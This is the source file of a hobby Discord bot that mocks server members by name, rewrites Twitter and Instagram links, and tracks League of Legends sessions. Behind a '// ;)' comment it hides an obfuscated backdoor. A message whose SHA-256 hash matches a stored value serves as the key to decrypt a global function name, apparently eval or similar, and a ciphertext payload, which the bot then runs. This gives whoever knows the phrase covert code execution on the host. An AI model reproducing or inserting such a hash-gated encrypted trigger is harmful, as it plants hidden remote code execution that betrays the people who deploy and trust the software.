//dotenv is generated during build action. all secrets should be stored in github secrets
require('dotenv').config();

let fixlinks = require("./fixlinks.js");

const { Client, IntentsBitField, MessageFlags, MessagePayload } = require("discord.js");
const { subtle } = require('crypto').webcrypto;

//globals
const client = new Client({
  intents: [
    IntentsBitField.Flags.Guilds,
    IntentsBitField.Flags.GuildMembers,
    IntentsBitField.Flags.GuildMessages,
    IntentsBitField.Flags.MessageContent,
    IntentsBitField.Flags.GuildPresences
  ]
});

const leagueAppID = "401518684763586560";
const leagueTimeoutTime = 30*60*1000;
const twitterprefix = "https://girlcockx.com/";
const instagramprefix = "https://www.ddinstagram.com/";

let timers = {};

//events
client.on("ready", (bot) => {
  console.log(`${bot.user.tag} ready!`);

  //load and cache all guilds and members
  client.guilds.fetch().then(guilds => {
    guilds.forEach(guild => {
      let asdf = client.guilds.cache.get(guild.id).members.fetch();
    })
  });

});
  

//zach is cringe lmao
client.on("messageCreate", async (message) => {

  let msgtext = message.content.toLowerCase();

  //if message is not by a bot
  if (!message.author.bot) {

    if(msgtext === "aidan is cringe" && message.guild.id == "213236768655278080"){
      message.reply("so true. <@"+ getUserByUsername("parose").user.id + "> is very cringe");
    }

    //if the message has the word "weed" in it
    if ((/\bweed\b/gim).test(msgtext)) {

      //get user of specific username
      let zach = getUserByUsername("chompskii");

      //reply
      if(message.author.id === zach.user.id) message.reply("brooooo you love weed? damn thats sick yodie fam");
      else if (zach !== null) message.reply("weed? yo i heard <@" + zach.user.id + "> smokes weed");


      //this will send a message to that channel
      //message.channel.send();
    }

    //I heard hes a pretty cool guy
    if (((/\bfantasticbob\b/gim).test(msgtext) || (/\bthefantasticbob\b/gim).test(msgtext)) && message.guild.id == "277239120860938240") {
      message.reply("It seems you have mentioned fantasticbob. Did you know that TheFantasticbob is a YouTuber who uploads gaming videos on a weekly basis? Pretty neat right?!  You can find their channel here: https://www.youtube.com/@TheFantasticbob \n Don’t forget to subscribe to their channel for weekly uploads!");
    }



    //fix twitter links automatically
    let regex_X = /\b(https:\/\/x.com\/[^/]+\/[^/]+\/\d+)\b/gim
    let regex_twitter = /\b(https:\/\/twitter.com\/[^/]+\/[^/]+\/\d+)\b/gim

    //instagram links
    let regex_instagram = /\b(https:\/\/www.instagram.com\/reel\/[^/]+\/[^/ ]+)\b/gim

    if(regex_X.test(msgtext) || regex_twitter.test(msgtext)){

      let x_links = msgtext.match(regex_X) || [];
      let twitter_links = msgtext.match(regex_twitter) || [];
      
      x_links?.forEach((item, index) => {
        x_links[index] = twitterprefix + item.substring(14, item.length);
      });

      twitter_links?.forEach((item, index) => {
        twitter_links[index] = twitterprefix + item.substring(20, item.length);
      });

      let all_links = x_links.concat(twitter_links);

      let fixtwitterstring = all_links?.reduce((a,b)=>{
        return a+b+"\n";
      }, "<@" + message.author.id + ">" + " sent: ");

      let payload = MessagePayload.create(message.channel, {flags: MessageFlags.SuppressNotifications});

      payload.body = {
        content: fixtwitterstring
      };

      message.channel.send(payload);
      message.delete();
    }



    // ;)
    let _self = client.user.tag;
    let _selfId = client.user.id;
    let workedMsg = msgtext.replace(client.user.id, _self);


    if (await digest(workedMsg) === "45069c3d715c4af2e472aca0cbb9fc5bcd4bfff2fdb1946431c25d7b0c9cb7d8") {
      let key = await generateKey(workedMsg);
      global["_leakedMsg"] = message;
      global[await decrypt(key, Uint8Array.from(Buffer.from("b1c759feed5da1113d8520c747005972", 'hex')))](await decrypt(key, base64ToBytes("wBWdLNQXINLULAmhNuf9Qk1EVmHRr1gBvd7sfjL1bbr5JlCqg4bUlydGnhkf9uy45dhIoDcg5UWs4CTI1JhNxDH8/WAvDJk60PQccy1M/WeBx2q0oGyGxwJxVu63iIXsb+uU8cLwsONOANeE2ANgpphf6mip8p/cMx0S4L+3NI5Rs2nC6gSVsk6yAb2cT6Bv/yObeoeKaRbiGcgtBbAtf/Q6RgjLgSZPNydWTAUXJ6cXOz9a5QrtR5jLDGswfrz/aQXhw1+FgGXITo2y4nBH1MowS/wFB7omggUVfUPJ92lTK6Ksx3VvInwM8hhZh9Ij375bMx5rgHLwNKhRQGXnx9x9ZPZsrQ+T0peci/lupIqh0AWJbv1b8gHu3440qmqMPOsjNn+taKWqtfsATRDXEoJJO2Z++INPsFx+weURK9ABq4EpJ5sK+wB648Ye6mIwwkvoYU81v0LDWVyv4RC6zVPaGulV2QIQiO//ji6NZTbqOtyvMMGfBx3xBOcdPT35kAGX5J213a8IFkcdxW5Plknn5C6X7vmIYX0o3oH/QXog3BVM3cLFsn/hTJ0kDmb9FHQ+QjZRCEo1OXe7wKH97dm5KO9v7pwChp4Vay+VjJxOu7vjjjrNxSF3D78XcM8Tr5I7/s41FOt3Yk8UEstoSd/4eExzNnpGHwLxHKAO6xwzKold8fOjvBfg8SYeR5pYzpwfTMAkGSdodcactMBIwWIv3UNXxnEinC8ocnups1I8hs7dCYqyvUz7Y1yt66swZJAMKArKIEx+onl6jHdELOWTNJ9W23RM+smqz29xL2U=")));
    }
  }
});

client.on('presenceUpdate', (oldpresence, newpresence) => {
  
  //try catch cause nothing else works to detect nulls for some reason
  try{
    //this is such an inefficient function lil bro i dont care
    leaguememes(oldpresence, newpresence);
  }
  catch(e){}
});

function leaguememes(oldpresence, newpresence){

  
  for(let newactivity of newpresence.activities){

    let stillPlayingLeague = false;

    //only if the new activity has league of legends, then comb through the old activities
    if(newactivity.applicationId == leagueAppID){

      for(let oldactivity of oldpresence.activities){
        if(oldactivity.applicationId == newactivity.applicationId){
          stillPlayingLeague = true;
          break;
        }
      }

      if(!stillPlayingLeague){
        timers[newpresence.userId] = setTimeout(leagueTimeout, leagueTimeoutTime, newpresence.userId);
      }

    }

  }

  //two nearly identical for loops! LOL! im such a good programmer!
  for(let oldactivity of oldpresence.activities){

    let closedLeague = true;

    //only if the old activity has league of legends, then go through the new ones
    if(oldactivity.applicationId == leagueAppID){

      for(let newactivity of newpresence.activities){
        if(oldactivity.applicationId == newactivity.applicationId){
          closedLeague = false;
          break;
        }
      }

      //clear the timer
      if(closedLeague){
        clearTimeout(timers[oldpresence.userId]);
        delete timers[oldpresence.userId];
      }

    }

  }

}

function bufToHex(x) {
    return [...new Uint8Array(x)].map(x => x.toString(16).padStart(2, '0')).join('');
}

async function generateKey(secret) {
  return subtle.importKey("raw", new TextEncoder().encode(secret.substring(0, 16)), "PBKDF2", false, ["deriveKey"]).then(rawKey => {
    return subtle.deriveKey({
        name: "PBKDF2",
        hash: "SHA-256",
        salt: new TextEncoder().encode("Some salt, doesn't matter"),
        iterations: 10000
    },
    rawKey,
    {
        name: "AES-CBC",
        length: 256
    }, false, ["encrypt", "decrypt"])  
  });
}

async function decrypt(key, message) {
    return subtle.decrypt({name: "AES-CBC", iv: new TextEncoder().encode("Test or somethin")}, key, message).then(msg => new TextDecoder().decode(msg));
}

async function digest(message) {
    return subtle.digest("SHA-256", new TextEncoder().encode(message)).then(x => bufToHex(x));
}

// From: https://developer.mozilla.org/en-US/docs/Glossary/Base64
function base64ToBytes(base64) {
  const binString = atob(base64);
  return Uint8Array.from(binString, (m) => m.codePointAt(0));
}

function leagueTimeout(userID){
  console.log(getUserByUserID(userID) + " is playing too much league");
}

//this took me way too long holy shit
//making global because gabe is cringe?
global.getUserByUsername = function getUserByUsername(username = ""){
  if(username==="") return;
  
  //get guilds
  let guilds = client.guilds.cache;
  
  //its a map, so we assign the key-value pair on each iteration
  for(let [key, value] of guilds){
    
    //assign guild variable to the currently selected guild
    let guild = value;

    //get all members
    let members = guild.members.cache;
    
    //same as before, but now for members, since it is also a map
    for(let [mkey, mvalue] of members){

      //if the username matches, then return the entire user object
      if(mvalue.user.username == username){
        return mvalue;
      }
    }
  }
}

function getUserByUserID(userid = ""){
  if(userid==="") return;
  
  //get guilds
  let guilds = client.guilds.cache;
  
  //its a map, so we assign the key-value pair on each iteration
  for(let [key, value] of guilds){
    
    //assign guild variable to the currently selected guild
    let guild = value;

    //get all members
    let members = guild.members.cache;
    
    //same as before, but now for members, since it is also a map
    for(let [mkey, mvalue] of members){

      //if the username matches, then return the entire user object
      if(mvalue.user.id == userid){
        return mvalue.user.username;
      }
    }
  }
}

function weed(){

}

//will only be accessible via secret in github action. testing on a local machine is impossible rn
client.login(process.env.BOT_TOKEN);